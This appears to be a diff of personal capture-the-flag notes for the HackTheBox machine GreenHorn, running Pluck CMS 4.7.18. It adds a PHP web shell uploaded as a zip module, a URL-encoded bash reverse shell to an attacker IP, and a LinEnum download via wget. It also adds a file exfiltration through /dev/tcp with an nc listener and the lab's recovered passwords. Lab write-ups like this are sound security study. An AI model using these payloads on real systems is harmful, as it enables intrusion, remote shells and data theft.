@@ -2,7 +2,14 @@
 #GreenHorn
 #Pluck CMS 4.7.18
 #GitHub Bad Practices
-#
+#https://crackstation.net/
+# URL Manipulation
+# Zip File RCE - Remote Shell
+# URL Encode for Bash Reverse shell
+# WWW-DATA escape
+# LinEnum sh auto Enum
+# Upload from Linux machine to Kali
+# Depix to Depixelize passwd
 #
 
 
@@ -28,6 +35,9 @@
                 http://greenhorn.htb/README.md
 
                 http://greenhorn.htb/install.php
+
+
+            http://greenhorn.htb/login.php + iloveyou1
                 
 
 
@@ -68,6 +78,67 @@
                     iloveyou1
                 
                 http://greenhorn.htb/login.php + iloveyou1
+
+
+
+        Pluck 4.7.18 RCE via Zip File:
+            We create a zip file containing - reverse.php with a simple <? php system($_REQUEST['cmd']); ?>
+
+            Then we Upload via the module management the zip and find the path to call it
+
+            Via BURP the Repeater does not want to work so we URL Encrypt and use it from the URL directly:
+                http://greenhorn.htb/data/modules/shell/reverse.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.77/4443+0%3E%261%27
+
+
+        TTY shell:
+            www-data@greenhorn:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+        Priv Esc from www-data:
+            We can download the reverse shell file on the remote host using the wget utility. 
+        We will traverse to the:
+            /dev/shm/STTY directory for downloading the file as this directory is writable by all the users by default.
+            cd /dev/shm/STTY
+
+        We create http server to upload linenum from our Kali:
+            ──╼ [★]$ python3 -m http.server 8888
+
+        From the Linux compromized machine:
+            wget -r http://10.10.14.77:8888/LinEnum.sh
+
+
+        We run the script:
+            chmod +x LinEnum.sh
+            www-data@greenhorn:/dev/shm/STTY/10.10.14.77:8888$ ./LinEnum.sh
+
+        1 - Enum:
+            We dont finr anything with www-data rights
+
+            We will try to connect with junior via iloveyou1
+
+            www-data@greenhorn:/dev/shm/STTY/10.10.14.77:8888$ su - junior
+
+            We are junior:
+                junior@greenhorn:~$ 
+
+            We found a File:
+                'Using OpenVAS.pdf'
+
+        2 - Upload OpenVas from the Linux to our Kali:
+            Kali:
+                └──╼ [★]$ nc -lvnp 9001 > openvas.pdf
+
+            Linux Machine:
+                cat 'Using OpenVAS.pdf' > /dev/tcp/10.10.14.77>9001
+
+            When we opened the pdf we fond a pixelize passwd:
+                We will use the "depix" python scirpt
+
+                Password: sidefromsidetheothersidesidefromsidetheotherside
+
+        3 - Priv Esc:
+            We are root now
+
 
 
 
